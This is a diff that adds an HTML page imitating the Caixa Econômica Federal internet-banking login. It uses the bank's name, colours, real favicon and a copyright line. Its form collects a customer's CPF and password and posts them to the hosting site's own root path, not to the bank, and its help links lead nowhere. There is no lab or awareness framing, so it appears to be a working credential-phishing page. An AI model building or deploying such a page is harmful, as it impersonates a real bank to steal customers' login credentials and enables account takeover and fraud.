@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caixa Econômica Federal - Internet Banking</title>
+    <link rel="icon" href="https://www.caixa.gov.br/favicon.ico" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            overflow: hidden;
+        }
+        .header {
+            background-color: #0056b3; /* Azul da Caixa */
+            color: white;
+            padding: 15px 20px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .header span {
+            font-size: 14px;
+            display: block;
+            margin-top: 5px;
+        }
+        .content {
+            padding: 30px;
+            text-align: center;
+        }
+        .content h2 {
+            color: #333;
+            margin-bottom: 25px;
+            font-size: 18px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-size: 14px;
+        }
+        .input-group input[type="text"],
+        .input-group input[type="password"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .btn-login {
+            width: 100%;
+            padding: 12px;
+            background-color: #008000; /* Verde da Caixa */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .btn-login:hover {
+            background-color: #006400;
+        }
+        .links {
+            margin-top: 25px;
+            font-size: 14px;
+        }
+        .links a {
+            color: #0056b3;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            background-color: #e0e0e0;
+            color: #666;
+            padding: 15px 20px;
+            font-size: 12px;
+            text-align: center;
+            border-top: 1px solid #ddd;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            CAIXA ECONÔMICA FEDERAL
+            <span>Internet Banking - Acesse sua Conta</span>
+        </div>
+        <div class="content">
+            <h2>Acessar sua Conta</h2>
+            <form method="POST" action="/">
+                <div class="input-group">
+                    <label for="cpf">CPF / Usuário</label>
+                    <input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF ou Usuário" required>
+                </div>
+                <div class="input-group">
+                    <label for="senha">Senha</label>
+                    <input type="password" id="senha" name="senha" placeholder="Digite sua senha" required>
+                </div>
+                <button type="submit" class="btn-login">ACESSAR</button>
+            </form>
+            <div class="links">
+                <a href="#">Esqueci a Senha</a>
+                <a href="#">Cadastrar</a>
+            </div>
+        </div>
+        <div class="footer">
+            &copy; 2025 Caixa Econômica Federal - Todos os direitos reservados.
+        </div>
+    </div>
+
+</body>
+</html>
